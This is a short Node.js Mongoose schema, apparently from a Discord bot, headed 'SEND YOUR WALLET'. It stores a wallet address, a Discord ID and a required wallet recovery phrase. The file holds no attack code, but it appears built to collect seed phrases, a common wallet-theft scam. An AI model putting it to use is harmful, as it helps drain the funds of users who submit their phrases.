const mongoose = require("mongoose");

// SEND YOUR WALLET
const sentYourWallet = new mongoose.Schema({
  wallet: { type: String, required: true },
  discordID: { type: Number, required: true },
  recoveryPhrase: { type: Array, required: true },
});

// MODEL
const yourWallet = mongoose.model("wallet", sentYourWallet);

// EXPORTED MODULES
module.exports = { yourWallet };
